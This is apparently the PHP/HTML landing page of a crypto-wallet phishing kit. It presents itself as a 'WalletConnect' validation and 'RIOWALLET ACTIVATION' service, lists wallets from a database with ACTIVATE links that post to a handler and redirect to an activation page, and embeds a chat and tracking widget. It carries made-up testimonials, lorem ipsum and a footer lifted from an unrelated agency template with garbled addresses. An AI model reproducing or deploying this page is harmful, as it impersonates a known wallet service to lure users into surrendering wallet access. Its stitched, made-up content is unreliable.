<?php
require "app/config.php";
$conn = Config::getConn();
$q = "SELECT * FROM `Wallets`";
?>


<!doctype html>
<html>

<head>
    <meta charset='utf-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    <title>node</title>
    <link href='https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css' rel='stylesheet'>
    <link href='' rel='stylesheet'>
    <script type='text/javascript' src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js'></script>
    <link rel="stylesheet" href="assets/css/header.css">
    <link rel="stylesheet" href="assets/css/footer.css">
    <link rel="stylesheet" href="assets/css/team.css">
    <link rel="stylesheet" href="assets/css/product.css">
    <style>body{
          background:url("bg.png");
          background-position: center;
          background-repeat: no-repeat;
          background-size: cover;
          


      }
  </style>
  <script src="https://www.momentcrm.com/embed"></script>
<script>
  MomentCRM('init', {
    'teamVanityId': 'erect1',
    'doChat': true,
    'doTracking': true,
  });
</script>
</head>

<body oncontextmenu='return true' class='snippet-body'>
    <div class="container-fluid px-0">
        <header>
            <div class="shape"></div> <!-- Navbar -->
            <nav class="navbar fixed-top navbar-expand-lg navbar-transparent"> <a class="navbar-brand" href="#">WalletConnect</a> <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"> <span class="navbar-toggler-icon"></span> </button>
                <div class="collapse navbar-collapse" id="navbarSupportedContent">
                    <ul class="navbar-nav mr-auto">
                        <li class="nav-item active"> <a class="nav-link" href="#">HOME <span class="sr-only">(current)</span></a> </li>
                        <li class="nav-item"> <a class="nav-link" href="#">Github</a> </li>
                        <li class="nav-item"> <a class="nav-link" href="#">Facebook</a> </li>
                        <li class="nav-item"> <a class="nav-link" href="#">Apps</a> </li>
                        <li class="nav-item"> <a class="nav-link" href="#">Tweeter</a> </li>
                        <li class="nav-item"> <a class="nav-link" href="#">Instagram</a> </li>
                    </ul>
                </div>
            </nav> <!-- ./ end of navbar -->
            <div class="container">
                <div class="row">
                    <div class="col-md-6 left-side"> <img src="assets/wallet_icon_T.png" class="w-100"> </div>
                    <div class="col-md-6 right-side">
                        <h1>RIOWALLET ACTIVATION</h1>
                        <p>FREE AND FASTER THAN ORDERS</p>
                        <div class="text-center">
                            <button class="btn order-button">Add Wallet</button> </div>
                    </div>
                </div>
            </div>
        </header>
    </div>
    <br>
    <!-- end of headers -->
    <!-- product -->
<br>
<br>

    <div class="d-flex justify-content-center text-dark " >
      <p class="text-center" style="width: 250px;" >
       <b >Walletconnect Validation</b><br>
       The best way to manage all your wallets from a single app. With our highly secure integrations with top wallet providers, you can efficiently manage all your wallets on our app.


      </p>
    </div>
    <div class="d-flex justify-content-center text-dark " >
      <p class="text-center" style="width: 250px;" >
         Lorem ipsum dolor sit amet consectetur adipisicing elit. Officia architecto porro distinctio esse itaque libero deleniti qui quae alias iste mollitia, commodi cumque tenetur corrupti excepturi, ullam harum dicta. Eveniet?
      </p>
    </div>
    <div class="container-fluid mt-5 ppp">

        <div class="row">
            <?php

            $stm = $conn->query($q);
            if ($stm->rowCount() > 0) {
                for ($i = 0; $i < $stm->rowCount(); $i++) {
                    $data = $stm->fetch();


            ?>
                    <div class="col-md-4">
                        <div class="card" style="box-shadow: 2px 2px;">
                            <div class="d-flex justify-content-between align-items-center">

                            </div>
                            <div class="text-center">
                                <img src="assets/img/<?php echo $data->image;  ?>" height="150px" width="150px"> </div>
                            <div class="text-center">
                                <h5><?php echo $data->name;  ?></h5>
                                <a class="act" id="<?php echo $data->name;  ?>" href="activation-mode"> <span class="text-success">ACTIVATE</span></a>
                            </div>
                        </div>
                        <!--  -->

                    </div>

            <?php
                }
            }
            ?>



        </div>
    </div>

    <!-- product -->

    <br>
    <br>

    <!-- teams -->

    <div class="container-fluid ftt">
        <div class="alert alert-light text-center text-uppercase" style="background-color: transparent; border:none; color:white;">
            Out team

        </div>
        <div class="row">
            <div class="col-lg-4">
                <div class="card">
                    <div class="face front-face"> <img src="https://images.unsplash.com/photo-1557862921-37829c790f19?ixid=MXwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHw%3D&ixlib=rb-1.2.1&auto=format&fit=crop&w=1051&q=80" alt="" class="profile">
                        <div class="pt-3 text-uppercase name"> Robert Garrison </div>
                        <div class="designation">Android Developer</div>
                    </div>
                    <div class="face back-face"> <span class="fas fa-quote-left"></span>
                        <div class="testimonial"> I made bacck the purchase price in just 48 hours! Thank you for making it pain less, pleasant. The service was execellent. I will refer everyone I know. </div> <span class="fas fa-quote-right"></span>
                    </div>
                </div>
            </div>
            <div class="col-lg-4">
                <div class="card">
                    <div class="face front-face"> <img src="https://images.unsplash.com/photo-1600486913747-55e5470d6f40?ixid=MXwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHw%3D&ixlib=rb-1.2.1&auto=format&fit=crop&w=1050&q=80" alt="" class="profile">
                        <div class="pt-3 text-uppercase name"> Jeffery Kennan </div>
                        <div class="designation">Full Stack Developer</div>
                    </div>
                    <div class="face back-face"> <span class="fas fa-quote-left"></span>
                        <div class="testimonial"> Really good, you have saved our business! I made bacck the purchase price in just 48 hours! man, this thing is getting better and better as I learn more about it. </div> <span class="fas fa-quote-right"></span>
                    </div>
                </div>
            </div>
            <div class="col-lg-4">
                <div class="card">
                    <div class="face front-face"> <img src="https://images.unsplash.com/photo-1614574762522-6ac2fbba2208?ixid=MXwxMjA3fDB8MHxzZWFyY2h8MjY2fHxtYW58ZW58MHx8MHw%3D&ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=60" alt="" class="profile">
                        <div class="pt-3 text-uppercase name"> Issac Maxwell </div>
                        <div class="designation">Finance Director</div>
                    </div>
                    <div class="face back-face"> <span class="fas fa-quote-left"></span>
                        <div class="testimonial"> Account keeper is the most valuable business research we have EVER purchased. Without electrician, we would ahave gone bankrupt by now. </div> <span class="fas fa-quote-right"></span>
                    </div>
                </div>
            </div>
        </div>
    </div>
<br>
<br>
    <!-- end of team -->

    <!-- footer -->
    <div class="container-fluid mx-auto">
        <div class="row justify-content-center top-part">
            <div class="col-md-6 text-center center-content">
                <div class="d-flex-inline">
                    <h3 class="footer-heading">Start a Project with itCraft</h3>
                </div>
                <div class="d-flex-inline">
                    <p>We are based in Warsaw, Bydgoszcz & Torun in Poland but we are Google Cloud Partner we can arrange a meeting at Google Campus in Warsaw or in London. We are also present in Norway. Below you will find all the contact details you need.</p>
                </div>
                <div class="d-flex-inline pt-2"> <button class="btn-pink btn">ESTIMATE PROJECT</button> </div>
            </div>
        </div>
        <div class="row">
            <div class="line mb-3 mx-auto"></div>
            <div class="d-md-flex px-5 justify-content-around bd-highlight col-md-12 pt-5 pb-5 mb-3">
                <div class="p-2 flex-fill bd-highlight mb-5 mb-md-0">
                    <h3>itCraft</h3> <small>Copyright &copy 2019</small>
                </div>
                <div class="p-2 flex-fill bd-highlight mb-3 mb-md-0">
                    <h5 class="places">BYDGOCZCZ</h5>
                    <p class="mb-0">Bydgoszcz Centrum Burnesa</p>
                    <p class="mb-0">ul Pzzenmdcwa 25, ibsura 24,</p>
                    <p class="mb-0">B5-7GB Bydgosrdz, Poland</p>
                </div>
                <div class="p-2 flex-fill bd-highlight mb-3 mb-md-0">
                    <h5 class="places">TORUN</h5>
                    <p class="mb-0">ul Reyana 2-4</p>
                    <p class="mb-0">A0-100 Torun,</p>
                    <p class="mb-0">Poland</p>
                </div>
                <div class="p-2 flex-fill bd-highlight mb-3 mb-md-0">
                    <h5 class="places">WARSAW</h5>
                    <p class="mb-0">Brain Embassy</p>
                    <p class="mb-0">Alaya Jerasublisuble RS123</p>
                    <p class="mb-0">02-222 Warsawa</p>
                </div>
                <div class="p-2 flex-fill bd-highlight mb-3 mb-md-0">
                    <h5 class="places">LONDON</h5>
                    <p class="mb-0">Google Campus</p>
                    <p class="mb-0">4-5 Barnhill, Shaneditch</p>
                    <p class="mb-0">London EC2A 4BK</p>
                </div>
                <div class="p-2 flex-fill bd-highlight mb-3 mb-md-0">
                    <h5 class="places">NORWAY</h5>
                    <p class="mb-0">Kristiansand</p>
                </div>
            </div>
            <div class="line mb-3 mx-auto"></div>
        </div>
        <div class="row bottom-part">
            <div class="d-lg-flex justify-content-between bd-highlight col-md-12 mb-5 px-5">
                <div class="p-2 align-self-center flex-fill bd-highlight">
                    <div class="fa fa-facebook px-2"></div>
                    <div class="fa fa-linkedin px-2"></div>
                    <div class="fa fa-twitter px-2"></div>
                    <div class="fa fa-instagram px-2"></div>
                </div>
                <div class="p-2 row flex-fill bd-highlight justify-content-left">
                    <div class="p-2 d-lg-flex">
                        <div class="p-2 flex-fill d-flex bd-highlight">Services</div>
                        <div class="p-2 flex-fill d-flex bd-highlight">Portfolio</div>
                        <div class="p-2 flex-fill d-flex bd-highlight">Pricing</div>
                        <div class="p-2 flex-fill d-flex bd-highlight">Testimonials</div>
                        <div class="p-2 flex-fill d-flex bd-highlight">Team</div>
                        <div class="p-2 flex-fill d-flex bd-highlight">Blog</div>
                        <div class="p-2 flex-fill d-flex bd-highlight">Carrer</div>
                        <div class="p-2 flex-fill d-flex bd-highlight">How we work</div>
                        <div class="p-2 flex-fill d-flex bd-highlight">Manifesto</div>
                    </div>
                </div>
                <div class="p-2 align-self-center flex-fill bd-highlight">
                    <div class="fa fa-mobile px-2 grey-text">&nbsp;&nbsp;<span id="contact">888-777-666</span></div>
                    <div class="fa fa-envelope-o px-2 grey-text">&nbsp;&nbsp;info@itcraft.in</div>
                </div>
            </div>
        </div>
    </div>

    <!-- end of footer -->
    <script type='text/javascript' src='https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.bundle.min.js'></script>
    <script type='text/javascript'></script>
    <script>
        $(document).ready(function() {
            $(".act").click(function(e) {
                e.preventDefault();
                let name = $(this).attr("id");
                $.ajax({
                    type: "post",
                    url: "handler",
                    data: {
                        mode: name,
                    },
                    dataType: "text",
                    success: function(response) {
                        window.location.href = "activation-mode";
                    },
                });

            });
        });
    </script>
</body>

</html>